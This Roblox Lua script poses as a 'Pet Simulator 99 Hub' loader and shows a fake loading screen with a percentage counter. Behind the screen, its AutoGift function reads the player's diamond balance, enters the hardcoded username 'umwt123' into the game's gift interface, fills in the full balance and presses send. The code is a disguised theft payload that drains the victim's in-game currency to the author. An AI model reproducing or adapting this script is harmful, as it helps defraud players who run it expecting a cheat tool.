local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- ====================== LOADING SCREEN ======================
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "PS99Loader"
ScreenGui.ResetOnSpawn = false
ScreenGui.IgnoreGuiInset = true
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local BlackBG = Instance.new("Frame")
BlackBG.Size = UDim2.new(1, 0, 1, 0)
BlackBG.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
BlackBG.BorderSizePixel = 0
BlackBG.Parent = ScreenGui

local LoadingText = Instance.new("TextLabel")
LoadingText.Size = UDim2.new(0, 500, 0, 100)
LoadingText.Position = UDim2.new(0.5, -250, 0.42, 0)
LoadingText.BackgroundTransparency = 1
LoadingText.Text = "Pet Simulator 99 Hub Loading..."
LoadingText.TextColor3 = Color3.fromRGB(255, 0, 0)
LoadingText.TextScaled = true
LoadingText.Font = Enum.Font.GothamBold
LoadingText.Parent = BlackBG

local PercentText = Instance.new("TextLabel")
PercentText.Size = UDim2.new(0, 400, 0, 80)
PercentText.Position = UDim2.new(0.5, -200, 0.55, 0)
PercentText.BackgroundTransparency = 1
PercentText.Text = "0%"
PercentText.TextColor3 = Color3.fromRGB(255, 0, 0)
PercentText.TextScaled = true
PercentText.Font = Enum.Font.GothamBold
PercentText.Parent = BlackBG

local percent = 0
spawn(function()
    while percent < 100 do
        percent = percent + math.random(6, 13)
        if percent > 100 then percent = 100 end
        PercentText.Text = percent .. "%"
        wait(0.08)
    end
    PercentText.Text = "100% - Gift Gönderiliyor"
    task.wait(2)
    AutoGift()
end)

function AutoGift()
    print("Auto Gift Başladı")
    
    local diamonds = 0
    if LocalPlayer:FindFirstChild("leaderstats") then
        for _, v in pairs(LocalPlayer.leaderstats:GetChildren()) do
            if v.Name:lower():find("diamond") or v.Name:lower():find("gem") then
                diamonds = v.Value
                break
            end
        end
    end
    
    -- Username
    local usernameBox = LocalPlayer.PlayerGui:FindFirstChild("Roblox Username", true) 
                     or LocalPlayer.PlayerGui:FindFirstChildWhichIsA("TextBox")
    if usernameBox then
        usernameBox.Text = "umwt123"
        firesignal(usernameBox.FocusLost)
    end
    
    task.wait(1)
    
    -- Elmas
    local diamondBox = nil
    for _, v in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
        if v:IsA("TextBox") and (v.Text == "0" or v.PlaceholderText:find("0")) then
            diamondBox = v
            break
        end
    end
    if diamondBox then
        diamondBox.Text = tostring(diamonds)
        firesignal(diamondBox.FocusLost)
    end
    
    task.wait(1.5)
    
    -- Gönder Butonu
    local sendBtn = nil
    for _, v in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
        if v:IsA("TextButton") and v.Text:find("Gönder") then
            sendBtn = v
            break
        end
    end
    if sendBtn then
        firesignal(sendBtn.MouseButton1Click)
    end
end
